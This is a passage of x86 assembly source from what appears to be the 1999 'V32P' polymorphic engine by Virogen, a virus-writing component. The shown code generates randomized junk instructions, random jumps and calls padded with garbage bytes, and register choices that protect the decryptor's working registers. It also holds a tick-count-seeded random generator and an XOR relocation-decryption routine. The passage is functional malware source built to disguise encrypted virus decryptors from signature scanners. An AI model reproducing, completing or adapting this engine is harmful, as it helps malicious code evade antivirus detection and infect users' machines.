        jmp 	one_gbg_done
not_gadd:
        cmp 	dx,_gsub
        jnz 	not_gsub
        call 	setup_gbg_v
        call 	asm_sub_v
        jmp 	one_gbg_done
not_gsub:        
        cmp 	dx,_gxor
        jnz 	not_gxor
        call 	setup_gbg_v
        call 	asm_xor_v
        jmp 	one_gbg_done
not_gxor:
	cmp 	dx,_gor
	jnz 	not_gor
	call 	setup_gbg_v
	call 	asm_or_v
	jmp 	one_gbg_done
not_gor:	
	cmp 	dx,_gand
	jnz 	not_gand
	call 	setup_gbg_v
	call 	asm_and_v
	jmp 	one_gbg_done
not_gand:
	cmp 	dx,_gtest
	jnz 	not_gtest
	call 	setup_gbg_v
	call 	asm_test_v
	jmp 	one_gbg_done
not_gtest:			
        cmp 	dx,_gcmp
        jnz 	not_gcmp
        call 	setup_gbg_v
        call 	asm_xor_v
        jmp 	one_gbg_done
not_gcmp:
        cmp 	dx,_ginc
        jnz 	not_ginc
        call 	setup_gbg_v
        call 	asm_inc
        jmp 	one_gbg_done
not_ginc:
        cmp 	dx,_gdec
        jnz 	not_gdec
        call 	setup_gbg_v
        call 	asm_dec
        jmp 	one_gbg_done
not_gdec:
        cmp 	dx,_gmovr
        jnz 	not_gmovr
        call 	setup_gbg_r
        call	asm_mov_r
        jmp 	one_gbg_done
not_gmovr:
        cmp 	dx,_gaddr
        jnz 	not_gaddr
        call 	setup_gbg_r
        call 	asm_add_r
        jmp 	one_gbg_done
not_gaddr:
        cmp 	dx,_gsubr
        jnz 	not_gsubr
        call 	setup_gbg_r
        call 	asm_sub_r
        jmp 	one_gbg_done
not_gsubr:
        cmp 	dx,_gxorr
        jnz 	not_gxorr
        call 	setup_gbg_r
        call 	asm_xor_r
        jmp 	one_gbg_done
not_gxorr:
        cmp 	dx,_gcmpr
        jnz 	not_gcmpr
        call 	setup_gbg_r
        call 	asm_cmp_r                 
        jmp 	one_gbg_done
not_gcmpr:        
	cmp 	dx,_gmovrr
	jnz 	not_gmovrr
        call 	setup_gbg_rr
        call 	asm_mov_r
	jmp 	one_gbg_done                        
not_gmovrr:
	cmp 	dx,_gcmprr
	jnz 	not_gcmprr
        call 	setup_gbg_rr
        call 	asm_cmp_r
	jmp 	one_gbg_done                        	
not_gcmprr:
	cmp 	dx,_gaddrr
	jnz 	not_gaddrr
        call 	setup_gbg_rr        
        call 	asm_add_r
	jmp 	one_gbg_done                        
not_gaddrr:
	cmp 	dx,_gsubrr
	jnz 	not_gsubrr
        call 	setup_gbg_rr
        call 	asm_sub_r
	jmp 	one_gbg_done                        
not_gsubrr:			
	cmp 	dx,_gone
	jnz 	not_gone
	;mov 	ecx,(offset one_byte_misc_ops_ends-offset one_byte_misc_ops)
	;call 	rndnum
	;lea 	esi,one_byte_misc_ops[ebp+edx]
	;movsb
	jmp 	one_gbg_done
not_gone:	
        cmp 	dx,_gjmp
        jnz 	not_gjmp
        test	Flags[ebp],DISABLE_JMPS
        jnz	not_gjmp        
get_jmpsize_again:        
        mov 	ecx,max_jmp_size        
        call 	rndnum             ; get bytes to jmp
        or 	edx,edx		; must be non-zero
        jz 	get_jmpsize_again
        push 	edx
        mov 	ebx,-5              ; cuz positive, not negative jump
        call 	asm_jmp            ; destination already in edx
        pop 	ecx
        call 	write_random       ; write random data
        jmp 	one_gbg_done
not_gjmp:
        cmp 	dx,_gcall   
        jnz 	not_gcall           
        test	Flags[ebp],DISABLE_CALLS
        jnz	not_gcall
get_callsize_again:
	mov 	ecx,max_call_size
	call 	rndnum	
	or	edx,edx
	jz	get_callsize_again
	push	edx
	mov	ebx,-5
	call	asm_call
	pop	ecx
	call	write_random
	;todo: add variations to stack adjustment	
	call	pop_register_random_method
	;jmp	one_gbg_done
not_gcall:

one_gbg_done:
        pop 	ecx
        or 	ecx,ecx
        jz 	end_gbg
        dec 	ecx
        jmp 	garbage_loop
end_gbg:                
	mov 	gbg_on[ebp],1
	pop 	edx ecx ebx eax
        ret

; returns:
; ebx=reg1
; edx=reg2
setup_gbg_rr:
        call 	setup_gbg_v
        push 	ebx
        call 	setup_gbg_v
        pop 	edx
	ret
; returns -
;   ecx=value
;   ebx=register
setup_gbg_v:
        call 	rndsize
        push 	edx
        xchg 	ecx,edx
        call 	test_bits          ; we can't use 
        cmp 	ax,_byte            ; ebp,edi,esi in byte operand
        jnz 	all_ok
gtta_get:
        call 	get_reg
        cmp 	edx,_ebp
        jl 	got_good_reg
        jmp 	gtta_get
all_ok:
        call 	get_reg
got_good_reg:
        xchg 	edx,ebx
        pop 	ecx
        ret

; returns -
;   ebx=reg1
;   edx=reg2
setup_gbg_r:
        call 	get_reg
        push	 edx
        call 	get_reg
        pop 	ebx
        ret

;-----------------------------------------------------------
;
; POPs dword off stack (esp+4) /w random method
;
; todo: add more variations to this function
;
_p_pop equ 0
_a_esp equ 1
_s_esp equ 2
pop_register_random_method:
	mov	ecx,_s_esp
	call	rndnum
	cmp	edx,_p_pop
	jnz	not_p_pop
	call	get_reg
	call	pop_reg
	jmp	end_pop_register_random_method
not_p_pop:
	mov	ebx,_esp
	;cmp	edx,_a_esp
	;jnz	not_a_esp	
	;mov	ecx,4
	;call	asm_add_v
	;jmp	end_pop_register_random_method
not_a_esp:
	;cmp	edx,_s_esp
	;jnz	not_s_esp	
	cmp	edx,_s_esp
	mov	ecx,-4
	call	asm_sub_v
not_s_esp:	
end_pop_register_random_method:			
	ret
	
;-----------------------------------------------------------
; assemble pop reg
; entry: edx=register
;
pop_reg:
	mov 	al,_pop
	add 	al,dl
	stosb
	ret

;-----------------------------------------------------------
; write random data
;   entry: ecx=amount in bytes

write_random:
   	push 	ecx
   	mov 	ecx,max_rnd
   	call 	rndnum
   	mov 	eax,edx
   	stosb
   	pop 	ecx
   	loop 	write_random
   	ret

;-----------------------------------------------------------
; gets a random register, returns in edx
;  does not return a register already used in a function
;
get_reg:
   	mov 	ecx,_esi
   	call 	rndnum
   	cmp 	edx,_esp                         ; we don't want esp
   	jz 	get_reg
   	cmp 	edx,[ebp+preg]                   ; or any functional register
   	jz 	get_reg
   	cmp 	edx,[ebp+creg]
   	jz 	get_reg
   	cmp 	edx,[ebp+lreg]
   	jz 	get_reg
	ret

;-----------------------------------------------------------------
; test_bits - test a values bitsize
;   on entry: ecx=value
;   on exit: eax=_dword_,_word_,or_byte_
;
test_bits:
   	cmp 	ecx,0
   	jz 	return_dword
   	mov 	eax,ecx
   	and 	eax,0ffff0000h
   	cmp 	eax,0
   	jnz 	return_dword
   	mov 	eax,ecx
   	and 	eax,0000ff00h
   	cmp 	eax,0
   	jnz 	return_word
return_byte:
   	mov 	eax,_byte
   	ret
return_word:
   	mov 	eax,_word
   	ret
return_dword:
   	mov 	eax,_dword
   	ret

;---------------------------------------------------------------
; select_lreg - selects a good lreg
;  returns: edx=reg
;
select_lreg:
  	call 	get_reg
  	call 	test_lreg
  	jc 	select_lreg
  	ret

;----------------------------------------------------------------
; test_lreg - lreg must not be ebp,esi,or edi if we're using 8bit
;             cryption
;  entry: edx=reg
;  returns: carry if bad
; 
test_lreg:
   	cmp 	[ebp+crypt_size],1       ; 8bit?
   	jnz 	good_testl
   	cmp 	edx,_ebp
   	jz 	bad_testl
   	cmp 	edx,_esi
   	jz 	bad_testl
   	cmp 	edx,_edi
   	jnz 	good_testl
bad_testl:
   	stc
   	ret
good_testl:
   	clc
   	ret
 
rndsize:                ; get only byte,word,or dword at random
   	mov 	ecx,_dword
   	call 	rndnum
   	cmp 	dx,_byte
   	jz 	rndbyte
   	cmp 	dx,_word
   	jz 	rndword
maxrndnum:
   	mov 	ecx,0fffffffeh
   	jmp 	rndnum
rndbyte:
   	mov 	ecx,000000ffh
   	jmp 	rndnum
rndword:
   	mov 	ecx,0000ffffh
;-----------------------------------------------------------------
; retrieve 32bit random number
;   on entry:
;      ecx=max number
;   on exit:
;      edx=number returned
;
rndnum:      
  	mov 	eax,[ebp+rndizer]
  	or 	eax,eax
  	jnz 	find_num
  	push	ecx
  	call 	[ebp+GetTickCountAddr]
  	pop 	ecx
  	add 	eax,[ebp+rndizer]                         ; randomness when we're
find_num:  
  	push 	ecx
  	xor 	edx,edx
  	mov 	ecx,6255h
  	mul 	ecx  
  	add 	eax,3619h
  	pop 	ecx    
  	mov 	[ebp+rndizer],eax                         ; retrieving too quick
  	xor 	edx,edx
  	inc 	ecx
  	div 	ecx                                       ; divide eax by max num+1
                                                ; remainder will be <= maxnum
  	ret                                            

test_reloc_decrypt:   
   	push	esi
   	sub	esi,4
   	cmp	esi,ebx
   	jb	jno_decrypt_reloc  
   	cmp	esi,edx
   	jae	jno_decrypt_reloc
   	push	edx
   	mov	edx,reloc_key[ebp]
   	xor	dword ptr [edi-2],edx
   	pop	edx
jno_decrypt_reloc: 
	pop	esi  
   	ret
   	
db '__V32P v0.06 alpha stage development, (c)1999 Virogen__'
v32p endp

end start
ends